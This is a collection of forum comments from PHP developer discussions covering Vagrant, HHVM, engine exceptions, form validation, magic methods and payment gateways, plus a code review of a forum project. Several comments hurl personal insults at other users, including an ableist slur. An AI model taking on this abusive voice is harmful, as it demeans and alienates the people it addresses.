&gt; Then that alone is a huge problem. You'll be picking and scratching your head wondering why it works locally but not on the prod server. Nope. Sorry, I get what you're saying, really I do. But in the last five years this has **never** happened. I commit. I push. It works. I know what you're trying to say, really I do. But Vagrant seems to be an excellent way to solve a problem I don't have, in order to get a solution I don't care about. &gt; It also helps if you have to pull in a clients project and they have special conditions with their code, you can setup a VM using their specifications and it doesn't interfere with any other projects you're working on.. I don't work on client projects, just my own. 
The last thing I want in my work is "disposable". Why do I care about disposable? And what does repeatable have to do with anything? I prefer persistent. Why is "disposable and repeatable" a benefit? &gt; Imagine you get MAMP installed. Then you try some new "thing" and now MAMP stops working. Wat do? Why would that happen? Seriously. This sounds like a non-issue to me. The fact is I don't actually GET Vagrant. I have no idea what it does. I know it's a VM and you can make multiple machines run, and they spin up and spin down and that's great. But I understand how vhosts work, I don't understand how Vagrant works. For example: what is the host? http://... what? What's the host name? Can I set it? Can I run multiple hosts? Because I'm working on multiple projects, often simultaneously, does that work? Where does my data live? Do I have to set up git? Do I need a separate working copy for the vagrant install? Do I change the files that are in vagrant, then commit them, then pull them back to a main copy? If I change projects to work on another one for an hour, do I need to close down one project and start up another? What about databases? What's my database doing? Do I install the database on the vagrant install, or somewhere else? Where is the data? Is it autopopulated? What from? What about test data? Can I keep the test data I've been using, or does it get wiped? Do you get what I mean? I have **absolutely no idea what Vagrant does** in terms of actual use, and I have a great deal of trouble seeing the benefits as a result. I don't want to be mister "I've been doing it this way for years and that's good enough for me, harumph", because I know that's absolute poison in this industry. But you have to be able to see clear benefits to a new approach, too. And I'm just not seeing them here. I'm sure vagrant is "better". But is it "better for me"? I don't see how it is.
It's pretty much literally telling you what the problem is. echo "&lt;p class="desc"&gt;$x_value&lt;/p&gt;"; The " is the problem. You've used " to quote the string, but then you've got quotes around your "desc" as well. So what php is trying to do is the following. echo "&lt;p class="; But then it doesn't know what to do with the rest of the line. It's all broken and nonsensical. Three easy solutions: echo '&lt;p class="desc"&gt;$x_value&lt;/p&gt;'; echo "&lt;p class=\"desc\"&gt;$x_value&lt;/p&gt;"; echo "&lt;p class='desc'&gt;$x_value&lt;/p&gt;"; My preference: foreach($blog_reverse as $x=&gt;$x_value){ ?&gt; &lt;h2&gt;&lt;?php echo $x ?&gt;&lt;/h2&gt; &lt;hr&gt; &lt;p class="desc"&gt;&lt;?php echo $x_value?&gt;&lt;/p&gt; &lt;br&gt; &lt;?php } 
Good effort. But... Your class at the moment doesn't handle a situation where the $_FILES index specified doesn't exist. Your class would instead issue various NOTICEs. Moving is_uploaded_file to the first check you can resolve all of these issues. There's also not checking on the format of arguments passed to various functions. E.g. the image resizing. You're not checking that indexes called height and width are specified before attempting to use them.
HHVM changes precisely nothing about the PHP ecosystem. The fact is the vast majority do not need, and will not benefit from replacing their stack with HHVM. Don't run away with the idea that they done this to benefit anyone but themselves; the only reason they had to do it, is simply because they picked the wrong language to deploy their service and had no choice but to rewrite, or hire real developers. They decided to rewrite. These are not clever decisions that we should all make an effort to emulate in our own projects, for the sake of our own projects.
Just a quick reply to say that I don't care what /u/mattaugamer says. That guy is a fucking dipshit. I'll reply more fully when I'm not wandering around with my phone. 
Better to use http://imagine.readthedocs.org/en/latest/
why so grumpy?
I'm afraid this is the kind of stuff that makes some people laugh at PHP and have no respect for PHP devs. How can you be a developer and not be able to use the command line, or set up a local dev environment, or use version control? Personally I recommend ditching Windows and using Ubuntu. It's SO much easier to develop in Ubuntu. Everything just works. And you can use the command line everyday. And it's the same environment you'll prob use in production. And it's FREE. But if you have a couple of grand to spare then you could get a Mac, if you really need the extra bells and whistles. Just ditch Windows. EDIT: To be a bit more helpful, I recommend this book to help you to get to grips with Linux http://nostarch.com/tlcl.htm. Learning Linux will make everything make more sense. Also, definitely use Laravel. I haven't, but I did learn Symfony2 and like Laravel, it is built around composer, and these modern frameworks will help you get to grips with modern practices such as Composer.
Thanks, I was looking for something like that.
&gt; they picked the wrong language to deploy their service and had no choice but to rewrite, or hire real developers. It would appear to me they did both. They hired *real* developers to rewrite the PHP interpreter. Also, y u so mad?
You don't really think that it's beyond the capabilities of the people working on PHP to create a JIT do you ?? As I said, it's not required, which is why it doesn't exist. PHP exists to service 80% of the internet, HHVM exists to service facebook, only. To say to _anyone_ that they _require_ the use of HHVM for their project is misleading, and dishonest. They in fact do not require it, since the problems that HHVM solve for facebook, alone, aren't problems for anything operating at a lesser scale (so that's pretty much _everything_).
The tool itself actually uses php_ini_scanned_files to read the config values, not just the parse_ini on the actual file. This gets all included configurations too.
Ok, proper response now. I seriously appreciate the actual answers to my questions. There were a few wrong assumptions, though. When I asked if I need to install Git I wasn't asking if version control was necessary. I was asking if I need to install it **in the VM**. &gt; When your work in a collaborative environment, you WANT your app to work exactly under the same conditions for every coworker. Totally. And I see the use there. But it seems any time the stack is brought up people go **OMG U MUST USE VAGRANT OR U SUCK**. I work alone exclusively. So again, I'm not really seeing the benefit **for me**. For some? Yes. For many? Yes. For all? Not necessarily. For me? Nope. It's probably something I'll learn, but as it doesn't solve any problem at all for me it will stay in the bottom of a very long list of shit I need to learn. &gt; If you destroy the box, that data is gone too. It's up to you to backup it, or use migrations. A lot of my stuff uses Laravel migrations, so this wouldn't be too big an issue. You could probably make `artisan migrate` part of the startup process. &gt; The point of the post of /u/mattaugamer was "Do not rest on your laurels, get out on your comfort zone. If you stop, you're washed behind." **THAT MAN IS WISE!** Seriously, though, this is true. But that doesn't mean you need to use everything that flashes before your eyes. It means you need to make rational assessments of the technologies available and choose the most effective ones. There is something called an "innovation curve", which impacts heavily on IT, and which I was alluding to in my salmon metaphor. Essentially, each S Curve is a... [actually, fuck it, here's a picture](http://anphase.com/wp-content/uploads/2010/11/Innovation-S-Curve.jpg). Thousand words and all that. We need to be careful not to just see the "drop" that makes us less productive. But if that following rise in productivity doesn't materialise, there is a net loss for no gain. Sometimes it can be hard to see that rise, it can be hard to see where we make that productivity increase from. When we talk about new technologies (such as Composer, PaaS systems, Git, frameworks, etc) that's what we're trying to actually show people, what we're trying to convey. Or at the very least what we **should** be. The rise in productivity that can be expected. And that's what no one has been able to successfully do for me with Vagrant. Not to my satisfaction.
Just write a function that accesses the $_POST array - instead of $formItemName you'd end up with post('formItemName'). The function can do any transformations you need. `extract` is useful in exactly one case - you have a bunch of vars in an array that have been programmatically created (ie. not based on user input) and prefer to access those var by name instead of by function (as above) in a view (assuming an MVC pattern in your site). And even then, there's probably a better way to do it.
The code is cringeworthy but the project itself is nice - hence my up vote. I love minimal discussion boards as nowadays running and using a discussion forum ends up like a whole operating system if all what you want is provide a platform to exchange texts... Let's are how this will develop...
Even though I like the project, it's poorly written I would say. Singletons, you don't benefit from auto-loading, but instead you require every file in the directories, without even needing them. Where are the tests!? It's poorly commented, more than one class definition per file. It seems like you've developed the project to support hosts for 5.2 or less, speaking of which there are no server requirements to be found, how do I know If I can use the project on my server, etc. Looking at the templates I see shit loads of functions, ughhh.. Poorly written authorization, you should definitely implement RBAC or some other access control, relying on a User level is hard to extend properly, what If I would want Admin, Super Admin, Mega Owner Admin (lol, but you get the point). You have "constants", that actually are global variables. Actually when having a more deeper look it actually looks like you are using globals existensivly through out the core, this is bad. And what's up with the database structure??? You use Text(20000)???? on almost every column, no indexes. The table name conventions are inconsistent between singular and plural. Do you hash the password, it doesn't seem like so (a quick look) The code could need a serious rewrite, it's duplicated code everywhere. The classes (especially) Auth has so much responsibility, I could probably refactor this to 4-5 classes or even more. To summarize this is a project following the principles of STUPID! However you shouldn't let you down, it could be improved a lot, and you got some serious refactoring to do until it's ready to be used in production!
I guess. In the time it took you to type out all these posts you could have read [this](https://jtreminio.com/2013/05/introduction_to_vagrant_puppet_and_introducing_puphpet_a_simple_to_use_vagrant_puppet_gui_configurator/) and played with [this](https://puphpet.com/) and you'd have it figured out. There's a reason people rave about it, but if you actively resist it, then you probably won't ever "get" it. But sure, if you all you ever work with is the same versions of Apache, MySQL and PHP, and your clients don't ever ask anything complicated of you, and you never have to work with others....
Ok, i've done a quick look, and im done editing now, this is my final answer :P
Yeah, and I think is also has some injection problems. And passwords without hashing. https://github.com/GetParrot/Parrot/blob/master/parrot/libraries/auth.php 
&gt; "Why should I use Parrot when Discourse has a much larger community and has been in development for years?" [...] It's made for the kinds of people who spend their days at coffee shops. Not some f*cked up company with people who are paid to do nothing. Do you have a problem with Discourse or the company behind it? I'm not a fanboy of Discourse, but seriously wtf is that? Also, poorly implemented, but the other comments are already explicit about this.
Dude you seem very pissed. Let's try to have a constructive discussion. &gt; To say to anyone that they require the use of HHVM for their project is misleading, and dishonest I've never seen HHVM tell everyone they *require* it instead of PHP :/ &gt; since the problems that HHVM solve for facebook, alone, aren't problems for anything operating at a lesser scale I have no performance problem, yet I'm really exited about HHVM because of all the new features and the leadership. I'm sick and tired of internals and Zend engine moving so slowly (and I don't mean that for you, you do a great work!). At last there is a solid alternative, and yay we get optional strict typing and collections!
You may be retarded. I never said I wasn't learning things. Sure, I could have learned Vagrant. I could have learned that instead of Laravel. Or instead of Composer. Or instead of Ember. Or instead of LESS. Or instead of Grunt. There's a long list of shit I'm actively trying to learn at the moment. I'm not "actively resisting" it. I'm just asking people to **give me a compelling reason to embrace it**. Something no one, including you, has bothered doing. You've just been a dick about it. I wrote a giant long fucking essay on the importance of learning new things and improving your workflow. And your takeaway from that was that I don't want to learn new things and improve my workflow. Good job. Top marks. Dipshit.
Oh..... God.... Honestly, this is what gives PHP a bad name at times. 
I haven't actually said anything that isn't 1) true and 2) constructive, it simply disagrees with your preconception so you hear it as harsh or less than constructive. A few months ago, I had a conversation with Anthony (ircmaxell), he put forward the hypothesis that forking PHP would be destructive act; it fractures the community and creates two sets of problems (at least), where there was only one before. I wasn't very sympathetic to this view, firstly, while it wasn't called forking, Linux is a brilliant example of lots of teams taking something and running with it, a more modern, comparable example might be Percona. I was wrong ... I see fractures forming, and I see people jumping into the chasms left in their wake; the very thing that keeps PHP stable is the fact that it does move slowly, and it must move slowly, moreover it must move in such a way that does not compromise stability since it has the weight of the internet bearing down on it. HHVM solves a problem that you freely admit you do not have, yet, you are still willing to to tout is as a solution, to a problem that you do not have. That's illogical, and only serves to exaggerate the problem ... Facebook did not implement hhvm for the good of everyone else, they did not do it to solve your problems or even to solve the problems of PHP, but to solve problems they have, and pretty much only them. In releasing the solution to their problem, and wrapping it up like it solves all problems, they provide ammunition for people that do not know any better to blog about and advise their peers and colleagues to use a solution to problems that nobody has. Jump into the chasm, if you wish, I'll keep my feet firmly on the ground ...
&gt;Personally I recommend ditching Windows and using Ubuntu Just as soon as I can run photoshop on ubuntu. [GIMP: named that for a reason] But seriously, I'm downloading Ubuntu now.
This project started as an attempt to learn how to tie objects together so I can refactor [another project](https://github.com/sporkbox/sporkblog) in need of improvement. Going into this, I decided I wanted to take advantage of Composer and bring in a few libraries/packages for features I've wanted to implement, but didn't know how (like i18n). I'm at a point where I'm not sure how to "cleanly" build my objects and get them to talk. I feel like I need to improve and understand this *now*, before I build my model objects for things like Pages, Posts, Comments, Users, etc. So I threw it into a repo so people have concrete code to provide (hopefully constructive) feedback on. So, yeah. That sums things up pretty well. Hopefully this isn't 100% terrible.
I played with the demo a bit, and honestly the UX needs a lot of work. Minimalism in design is cool, but it still has to make sense from a functional perspective. Having to think "are these actually text fields?" or "how do I submit this new post?" is a big turn-off to a user.
I'm getting the feeling that, while I'm using objects in this project, I might not be using them in concert in a "clean" manner. `class/urlrouter.php` is one such place that I'm unsure of how to make better. An `include` inside a class doesn't seem right (it'd probably be better to create an object instead), but I'm at a point where it's not clear to me what the better structure would be. The way I understand OOP is objects exist to separate tasks and related code, and applications are built by creating these objects and combining them in a way that creates the desired effects. The combining and class design part is what I'm having the most trouble with. MVC is a design pattern that not even MVCers can all agree on for a structure or definition. I'm not knocking it, since this prototype will probably use some variant of it. But if it's going to be recommended I'll need to see actual code to illustrate what you mean. I've read a lot about it and there doesn't seem to be much consensus on what MVC *is*, but it's always recommended to use it. While I appreciate suggestions for frameworks that do everything for me, I'm not after that with this project. If I had a client and a deadline, sure. But I'm trying to learn. I won't learn if I let software do everything for me.
Honestly, i'm surprised you could build a project like this without knowing to implement SQL injection prevention ;P
http://www.reddit.com/r/webdev/wiki/faq Keep at it. There's a pretty big market for devs in your area. Start applying after a year or two of studying/learning and making your own applications (make apps that help you organize your hobbies, or track your calories, exercise, whatever). Start going to local meetups/user groups. You're not going to get hired right away, but you will if you keep at it.
How "MVC" and "autoloading" feature in the same sentence here I'm not really sure? MVC is a design pattern, nothing more - it has nothing to do with the concrete implementation.
Start creating websites. If you know what you're doing and you have something to show for it you will get a job. Trust me. Set up a github account and actively involve yourself in the community you want to be a part of. Never stop learning.
thanks.
thanks.
&gt; If you wanted to do it without a framework you should probably at least do something with autoloading and use PDO for database stuff As can be found in the code, I'm using Composer's autoloading to handle my project's dependencies and its classes. I plan on using PDO for my database objects as well, but I'm not feeling confident enough in my understanding to move forward until I have what's currently written a bit cleaner.
I am a bad person because I am not going to open your library and read any bit of what you worked hard to create. --But, I will redeem myself just a little bit and point you at OWASP ESAPI. Security is a big place, still plenty of room for good tools.
At quick glance it looks nice. My preference would be to have something like ($result-&gt;isValid()) over (!$result-&gt;hasErrors()).
I would love to see this pass. I agree with you; why would anyone not want catchable exceptions from the core?
Good suggestion. It avoids a potential double negative, which is always confusing.
I agree. Also "filters" denotes getting a (possibly modified) output based on the input. Filters could be used to automatically modify certain kinds of input, such as lowercasing email addresses, or converting spaces to dashes for slug urls.
Bollocks, Rasmus doesn't even always bother to vote. I think this is one of those RFC's that will happen eventually, there's some concern that if we push forward with this right now, we'll have a sort of mixture of errors and exceptions being emitted for the same kinds of errors within the engine. Those that have explained their reasons have said they like it, but feel it's more of a major version patch than a minor one ... a perfectly legitimate view, invited by Niki himself ... Simple as that ...
Fair point, and it was a cocky statement anyway. However: why is this information not directly visible to the userland? Don't tell me to dig into the internal mailing lists... :) And another point: really wana go down the "will come in PHP6" road again?
Think about solving the following issues 1. Translation. You must have error messages like "This input must be between %s and %s characters long" and not "This input must be between 6 and 10 characters long" 2. Client-side validation. How can you pass the the validator object to a helper object and get the rules for a jquery validation plugin? 3. Contextual validation. A field is required if another has a specific value 4. DRY. How can you make it that you don't have to provide the error messages all the time?
From a quick scan of recent posts the ML discussion, the main reason people are voting "No" is because this vote is for the change to go into 5.6, while a number of developers believe that the change (or how they would prefer the change to using Exceptions in the core) is major enough that it should be delayed until 6.0. Frankly, I think you're wrong. While PHP does need to evolve, doing so in a rushed manner that introduces more pain further down the line is not the way to do it. I don't see how anyone can say PHP is stuck when you look at how far it's come since even 5.0.
That is where the discussion is taking place ... I don't see that we can avoid the magic number 6 forever, there's some talk of skipping it completely, since the industry decided to release PHP6 books before it was even ready to be shipped, and I mean, it had serious problems - obviously else it would have been released. I don't think that's a very good idea, none of us wrote those books. This is not comparable to anything that allowed the first unicode implementation of PHP to fail. In actual fact, a good percentage of you have been using features that were written for PHP6 since 5.3, from this perspective you already had PHP6 and are looking forward to PHP7 :)
Hehe, right :) Thanky you for all your insights.
Vagrant is awesome because you can commit your setup into a single file. This is great when you have new dev's, they can simply run your vagrant file but it's also great whenever you want to do some work where you don't have access to your normal dev machine or your current dev machine dies, or a multitude of things happen that means you cannot work as planned. It's also better because it gives you can exact copy. You might keep things pretty clean, simple and have yet to run into version differences problems, but these are real problems that exist and as a contractor it's something I deal with on a regular basis. FYI your filesystem within vagrant should be in sync with the host, it's really not complicated and while I don't know much about MAMP there are definitely functions that don't behave the same between platforms, it does solve a real world issue but it doesn't require 0 effort. 
I've been using it for 3 months now for acceptance tests. I prefer it a lot more then Behat. Not sure about unit tests, as I don't see anything Codeception can do, that phpunit can't. 
Well if it really comes for php 6 (or 7), good. What's planned for this version btw? However I read there and there that they wanted to keep php "simple".. which according to some means just keep it like it is.
Looks good, although I would personally prefer something like.. $validator = new Validator($form); $validator-&gt;addRule(...); Rather than... $rules = new RuleSet(); ... $validator = new Validator(); $validator-&gt;setRuleSet($rules); $validator-&gt;setForm($form);
&gt; HHVM solves a problem that you freely admit you do not have, yet, you are still willing to to tout is as a solution, to a problem that you do not have. That's illogical, and only serves to exaggerate the problem ... Did you even read what I wrote? Here is a copy: &gt; I have no performance problem, yet I'm really exited about HHVM because of all the new features and the leadership. I'm sick and tired of internals and Zend engine moving so slowly (and I don't mean that for you, you do a great work!). At last there is a solid alternative, and yay we get optional strict typing and collections! What I am interested in is **strict typing** and **collections**. HHVM provides a solution for that, it's not just about performances.
I've looked at your Readme, but not the library yet. Real forms are often complex and multistage, with calculations and validations between steps, and at the end. A page of a form can have optional parts and conditional parts. People often need to go backwards and forwards to figure out a path - particularly when there's some conditional flow between pages - and it's annoying when you lose info on one path because you've followed a particular path, then backtracked, then gone forward down the path again. Validation happens at a field level, on a group of fields together, at a page level, and multipage, with dependencies on the answers. Validation needs to happen in two related stages - on the client side, when someone fills in a field, they need an immediate response but they should be able to ignore the warning that there's a problem. And also on the page level when someone submits - at that point it's usually useful to the developer to have a consistent set of data, although it's sometimes amazingly annoying to the user; think of your tax return form when you don't fill in some relatively innocuous field (e.g. name) but aren't allowed to progress and return to fill that in later. Parts of the form shouldn't be disabled even when invalid because it's always possible to somehow get into a state where the user needs to fill in a section that's not currently enabled. Source: me. I've written a framework for forms and form validation in the past. The best approach that I've found is an event driven approach. It's the most flexible.
why is this shit still here?
The advantage to relying on the gateway/service to handle recurring payments is security and stability, with a potential sacrifice in visibility. The advantage of doing it yourself is full visibility, with a potential sacrifice in stability (if your script or system breaks) and security (even handling the tokens must be treated as though they are credit cards for the purposes of architecture). For a small to mid-size project I would try to rely on the gateway/service as much as possible. Once you become a larger organization and you are handling thousands of payments, running everything yourself gives you flexibility you may require or your customers may demand.
&gt; I personally think that these people are still living 20 years ago God, I'm so sick of this attitude. I think I must be getting old. I wonder if other industries have the same point of view. "Joe, you have been a profession architect for 20 years. Your work has completely revolutionized the industry. You have seen and experienced more than I can even possibly imagine. I must conclude that you're an idiot that has no idea what you're doing." Doesn't really make any sense, does it?
Exceptions in the engine is a fairly large change. Sure we keep up with news about php. But there are millions of devs that don't. Making that kind of major change in a minor revision isn't such a great idea. I could see it needing in PHP 6. But I've been hearing about things that will be in PHP 6 for about 5 years now...
How would you encode field dependence rules? For example having a password field and a retype password field, how do you push the constraint that they should be equal?
Well I want to point out the PCI compliance level necessary to store credit card numbers. Do you have the time and ability to actually secure that information? The gateway provider has already taken care of this. Personally, implementing the security for PCI level 3 compliance is harder than using the tokens you're talking about, and potentially cheaper, since you have to pay for PCI compliance (unless your gateway offers it as a service) Not to mention, what happens if your cron fails? What happens when you need to scale? What happens if you're not as secure as you think? You're messing with people's hard earned money... In my eyes this isn't a time to choose the "easiest path"
The last thing you should do is provide alias functions that just get the result of another function and negate the result. Document your library properly and spend time implementing more important things rather than unnecessarily duplicating functionality in an odd and potentially confusing way.
I'm not familiar with Braintree, but I've built sites in the past that used PayPal and 2Checkout as payment options. With both of those providers, they would send a "postback" HTTP POST to a script on my end, anytime any transaction occurred. There was a way to pass in optional parameters during the initial transaction that would be included anytime the gateway did a postback, this made it fairly easy to have some sort of identifier (user's username, or account ID, whatever) tying the transaction to a certain account. This worked perfectly well for the model I was involved with, which was always monthly or quarterly recurring subscriptions. Not sure what your model is, though.
I have had bad experience with paypals IPN in the past. But that was 4 or 5 years back. The issue was delayed or complete absence of IPNs after a successful transaction. This happened in sandbox. This could work perfectly well, until one customer complains he account was not updated but his account charged. How will you go about debugging something like that?
Not every gateway provides a token, so if you are getting a token then the provider almost definitely has recurring billing anyway. As such, I'd rely on their functionality. The only reason I would not do so is if the subscription type is weekly or daily. Those subscription types tend to have a lot of turnover, and I might want to control that in my own code rather than sending so many start/stop requests to the gateway all of the time. Monthly or greater I would rely on the gateway. Source: Web developer specializing in eCommerce since 2007.
This isn't a job board.
Maybe you lack the experience and knowledge to understand the motivations of engineers who are much smarter than you.
Firstly, yes I guess PHP 6 will never see the light. So saying it will be implemented in php 6... uhuh Secondly, as http://semver.org/ states, as long as there is no backward incompatibility, I don't see any reason not to implement it in 5.6. Those who would want to make use of it, could, the others wouldn't be impacted and would just ignore it.
I don't know about Braintree, but PayPal has an IPN log that shows any calls they have made and whether they succeeded or not. Your payment gateway should at least have a log of the payments so if someone's account doesn't get automatically updated you should at least be able to see if they were charged.
wow, I didn't expect that one. Well, maybe you are too old to.. nah. Let's be gentle, would you?
My comment probably came out a little more harsh than I intended. Sorry! 
;)
Being new to PHP and only recently finding out about the magic methods I have an idea in my head that these do funky unwanted things. Is this correct? Do you have any more literature that will expand on these aside from the [PHP docs](http://php.net/manual/en/language.oop5.magic.php) that have some info on them?
I'm only 37, but in my experience youth sees the older generations unwillingness to change as a sign of being old and set in their ways, when it fact the older generation has learned the value of taking things slow. The older generations just roll their eyes when youth starts up with the "you're just set in your ways!" Personally I think error handling in PHP is atrocious, and converting some errors to exceptions is a good idea, but I don't think all errors should be changed. Various warnings and notices serve a very specific purpose, and should be left the way they are.
This makes sense. I'm not entirely sure why I didn't think to implement this. Thank you for the input!
All of these are good points. Thanks!
Yeah... Everyone I've shown this to has mentioned the verbosity of the library. I'm thinking they have a point, so I'll probably modify it to be this way.
I personally try to avoid magic methods, and use them as a last resort. Usually there are more traditional ways of solving a problem. Magic methods lead to developer confusion, and IDE's cannot deal with them at all.
This is why PHP can't have "nice" things that the overall community agrees it should have: https://wiki.php.net/rfc/engine_exceptions#vote
This is good information. Do you remember the name of the form framework you've built? I'd like to take a look at it, if you don't mind.
Magic methods introduce non-explicitness. Let me give you an example. Recall Warcraft games. You only know what you can see, everything else is shrouded in black. The only way for you to see what's on the other side of the map is to send a peon out there and follow along with them. If they come across something really noteworthy they'll show it on the map for you, but if they move on it is no longer shown on the map - you have to remember it is there. You can walk from point A to point B and there's nothing there the first time, but later in the game you send out another peon and it runs across 20 barracks that weren't there before. What happened? Factors completely outside of your control and visibility affected the landscape of the game. While you've been collecting wood and gold and shit, your enemy is stocking up on zerglings and is about to bum rush you. Magic methods, and in a way, static properties, function in a similar way. You don't really know what's going on because it's not written down somewhere. The `__set()` method can take an arbitrary string and transform it in nebulous ways (#fogofwar) that you may not have the will-power to memorize for 50 classes that you can interact with in a single request. Programming is executed by machines, but written and read by humans. Humans often-times take shortcuts that at the time may seem harmless, but before you know it you have Doctrine 1 and its minefield of magic methods for every single possible thing you could imagine, and debugging all of a sudden becomes this monstrously difficult task where if they had maybe not gone the route of magic methods it would be much easier to figure out what the hell is going on. Hope this helps!
Yeah, others have mentioned the verbosity of the library. I am thinking of modifying the library to work something like this: $validator = new Validator(); $validator-&gt;addRule( (new Rule()) -&gt;setFieldName('username') -&gt;addConstraint(Constraints::notBlank()) ); $validator-&gt;validate($form); Also, renaming the Constraints and Filters class is probably a good idea, as well.
I wrote a library to handle this type of situation. It's basically a trait that can be included in any class, and it allows you to specify the non-public property(ies) you want to make accessible and/or mutable, as well as controlling what value types are allowed. https://github.com/phine/lib-accessor
This is something that I've been thinking about for a while. Currently, you can set a constraint to make the field match a certain value, which could be a reference to the field you're wanting to mimic. $form = [ 'password' =&gt; 'test', 'password_repeat' =&gt; 'test' ]; $ruleset = new RuleSet(); $ruleset-&gt;add( (new Rule()) -&gt;setFieldName('password_repeat') -&gt;setMessage('Passwords must match') -&gt;addConstraint(Constraints::matchValue($form['password'])) ); This isn't an ideal solution for me, so I'm thinking of adding something like a FieldReference object. $form = [ 'password' =&gt; 'test', 'password_repeat' =&gt; 'test' ]; $ruleset = new RuleSet(); $ruleset-&gt;add( (new Rule()) -&gt;setFieldName('password_repeat') -&gt;setMessage('Passwords must match') -&gt;addConstraint(Constraints::mustMatch(new FieldReference('password'))) ); If you can think of a good way to do this, please let me know.
One thing that I notice (no pun intended) is missing here, as far as I can see, is a way to catch warnings and notices, without *needing* to catch them. I know that it's *kind of* possible with custom error handlers. But it would be nice if I could do this without tons of extra rigging, using simple try/catch syntax, while keeping the current default behavior of not interrupting program execution when uncaught. This would involve a couple of additions. First, the concept of a non-fatal exception, which would be a non-descendent of the common Exception class and would include notices and warnings. Second, a way to invoke a "resume" from within a catch statement, so execution continues right where it left off where the exception was first thrown. The default exception handler would call a resume on non-fatal exceptions, and do the normal behavior for other exceptions.
&gt; [The code base] had been architected over several years by mulitple different lead developers, and it showed. There was no consistent pattern to any of the structure. The oldest core of the system was a collection of “include” files that ran several levels deep. Later, someone had bolted on some class-oriented libraries, and third person has decided to try a framework rewrite. All of it was done in a different coding styles, with different naming conventions. The codebase is a mixed-up aggregagation of PHP, HTML, SQL, JS, and CSS, frequently all in the same file. And there are no tests at all! The “tests” are the QA team running over the site once or twice a week. &gt; &gt; After that first day, when you felt so enthusiastic, you have been reduced to feeling like a brand-new beginner every day since. It’s humiliating. Each day has been a new frustration, a new “WTF?” moment replayed in a dozen different ways. You want very much to to improve the codebase as it is, so that you can impose some sense and reason onto it, but the code is such an overwhelming mess of spaghetti that you don’t even know where to start. &gt; &gt; Overwhelmed and drowning in bad code that you inherited from others, you’re ready to give up. &gt; &gt; But what if I told you it didn’t have to be this way? What if I told you there was a specific series of small, incremental changes you could make over time to slowly make the codebase better, more modern, and thereby reduce your own sense that things are futile? &gt; &gt; My upcoming book, “Modernizing Legacy Applications in PHP”, does exactly that. Using my talk “It Was Like That When I Got Here” as a starting point, I condense 15 years of fixing PHP codebases into a collection of specific steps to complete in order. As you apply these small fixes, each one building on the last, you will be able to restructure your codebase from a spaghetti mess to a testable, organized, modernized application, free of globals and mixed concerns.
I'm far from the biggest expert on php, but in my career I have yet to see a problem that was best solved by magic methods, or come across magic methods that I couldn't refactor into better code. I generally just try to forget they exist. 
So if I understood that correctly (and correct me if I'm wrong), magic methods break the idea of having foolproof "this is what is going to happen 100% of the time" and introduce variability that is not under my control as the programmer?
Exactly.
Well, in frameworks such as symfony (1.4, because I haven't done work that much with forms in 2), the validation was done in stages. And you had a post/pre validation stages where you could do those specific cases. See [this](http://symfony.com/legacy/doc/cookbook/1_2/en/conditional-validator) example (although it's for version 1.2, it's the exact same thing). The trick there is that the post/pre validators have access to all the form fields. I'm not familiar with your code to have a suggestion. 
Or you know, write tests.
Rule::addConstraint allows callbacks. All Constraints and Filters are callbacks that the validator calls.
Using Aura components no doubt?
Well, for the reasons listed in the rfc under objections. 
That's not the plan, strangely.
PHP makes no claim to follow semantic versioning. This *is* a backwards-incompatible change: things that previously produced errors will now throw exceptions. 
Sounds promising, but I'm always hesitant about signing up for alerts on something that doesn't exist yet. Come back and tell me when I can evaluate it for myself. 
I've tried both methods to charge recurring subscription fees using PayPal and Authorize.net. My final conclusion is this: * If the payment processor offers a token based charge option (Auth.net), use it with a cron job instead of a recurring payment option. This method provides more flexibility and, in my opinion, a cleaner interchange of data. I prefer that my code be intelligent and demand its data from an API rather than sitting around waiting (hoping) for it to be delivered. * If the payment processor doesn't offer token based transactions (PayPal) use their recurring billing product. Over engineer your code to expect missed calls and bad data. I typically build a followup cron script to run sanity checks to make sure I'm getting the data that I expect.
The book uses this talk as a starting point: http://paul-m-jones.com/archives/2667 If you like that talk, you'll like the book. :-)
Interesting to know, I will look into converting when I have the time as well then. Thank you!
Regarding the translation: It doesn't have to be included in the library (to lower the entry barrier) but there should be an easy way to do that. I guess this is also true for client side validation.
I'd love to see something like this. It's extremely relevant to PHP since it's been in heavy use for over a decade, but many best practices have only come to the forefront in the past few years.
Exactly this. We'd ask for a list of transactions via the API, and it'd come with the keys that we submitted with the original starting transaction through the API, which we'd then reconcile against the customer's account. 
&gt;Programming is executed by machines, but written and read by humans I love the way that's expressed in the book [*ØMQ - The Guide*](http://zguide.zeromq.org/page:all): &gt;Programming is science dressed up as art because most of us don't understand the physics of software and it's rarely, if ever, taught. The physics of software is not algorithms, data structures, languages and abstractions. These are just tools we make, use, throw away. The real physics of software is the physics of people—specifically, our limitations when it comes to complexity, and our desire to work together to solve large problems in pieces. This is the science of programming: make building blocks that people can understand and use easily, and people will work together to solve the very largest problems.
I understand not wanted to use a framework because it feels like "cheating" but I would recommend using a big, opinionated framework like Symfony2 at first *because* it's cheating. The Symfony documentation will, at first, say stuff like "put your classes here." You'll say "why?" and it'll say "because I said so." Eventually, though, you'll start to see why it's organized like it is. Then, you could potentially move to a lighter framework, like Silix, till you have a good grasp of how objects are typically organized and grouped together. Otherwise, if you really want to go the diehard, DIY approach I'd recommend reading a good book on the subject. (Messing around with classes and asking reddit can only get you so far.) I'd recommend Matt Zandstra's PHP Objects, Patterns and Practice. He does a good job of explaining the how and the why of a lot of design patterns.
Here's one that's about PHP more generally, not framework-related: "It Was Like That When I Got Here: Steps Toward Modernizing a Legacy Codebase" http://paul-m-jones.com/archives/2667 I've got others but we'll see what everyone else brings up. ;-)
There is a few lines in the recommendation about fixing this. The errors will still act as errors, but will also throw a new exception type called "ErrorException" which is not an extension of Extension so currently implemented Exception handlers will not handle this. This means all current applications can keep running just how they do, and all future ones can start using the new features until they decide that they can deprecate the old error system.
Thank you, I appreciate you taking the time to explain it to me.
I don't know if there is a PHP equivalent but one of the better examples of magic methods I've used in Python is a package called sh. It basically lets you call arbitrary shell binaries using apparently native syntax so you do stuff like this: sh.git.checkout('something'); // translates to "git checkout something" sh.cat('/tmp/foo', '/tmp/bar') // cat /tmp/foo /tmp/bar sh.grep('php', sh.ps('aux')) // ps aux | grep php Obviously you couldn't implement all binaries so magic methods make sense here and provide a more reusable syntax.
Maybe this is too basic, but [PHP The Right Way](http://www.phptherightway.com/) is pretty essential.
Why not use an ORDER By clause in your SQL statement? SELECT Name, Height, Image, Description FROM Persons ORDER BY {{your_date_field}} ASC Also, what happens when you run this? You didn't mention a specific issue. 
